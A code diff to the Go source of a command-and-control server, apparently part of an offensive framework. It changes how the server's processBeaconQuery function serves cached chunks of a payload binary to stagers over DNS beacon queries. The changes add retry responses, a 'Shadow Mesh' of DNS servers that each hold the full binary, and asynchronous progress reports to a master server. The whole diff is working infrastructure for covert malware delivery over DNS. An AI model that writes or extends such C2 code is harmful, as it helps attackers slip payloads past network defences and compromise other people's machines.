@@ -2210,7 +2210,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 
 		logf("[Stager] No cached chunks and no Master connection")
-		return "", false
+		return "NO_CACHE", false
 
 	case "CHUNK":
 		// CHUNK|chunk_index|IP|session_id|timestamp - Request for a specific chunk
@@ -2225,8 +2225,9 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			logf("[Stager] Chunk request: index=%d, session=%s, ip=%s", chunkIndex, sessionID, stagerIP)
 		}
 
-		// For stager sessions (stg_* prefix), just serve from cache if available
+		// For stager sessions (stg_* prefix), serve from cache - no Master fallback needed
 		// This supports Shadow Mesh where different DNS servers handle different requests
+		// Each DNS server has the full binary cached, so we can serve any chunk locally
 		if strings.HasPrefix(sessionID, "stg_") {
 			clientBinaryID, totalChunks, hasCached := c2.db.GetCachedBinaryInfo()
 			if hasCached && totalChunks > 0 {
@@ -2255,13 +2256,23 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 					c2.mutex.Unlock()
 
 					c2.logStagerProgress(session, chunkIndex, clientIP)
+
+					// Report progress to Master (async) - report first, every 100th, and last chunk
+					if masterClient != nil && (chunkIndex == 0 || chunkIndex%100 == 0 || chunkIndex == totalChunks-1) {
+						go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
+					}
+
 					return fmt.Sprintf("CHUNK|%s", chunk), true
 				}
+				// Chunk not found but we have cache - this shouldn't happen
+				logf("[Stager] ERROR: Chunk %d not found in cache for binary %s", chunkIndex, clientBinaryID)
 			}
-			// No cache - fall through to Master
+			// No cache available - stager cache not synced yet
+			logf("[Stager] No cached binary available for stg_* session %s (chunk %d requested)", sessionID, chunkIndex)
+			return "RETRY", false
 		}
 
-		// Get session info for non-stager or cache miss
+		// Get session info for non-stg sessions (legacy/fallback)
 		c2.mutex.RLock()
 		session, exists := c2.stagerSessions[stagerIP]
 		c2.mutex.RUnlock()
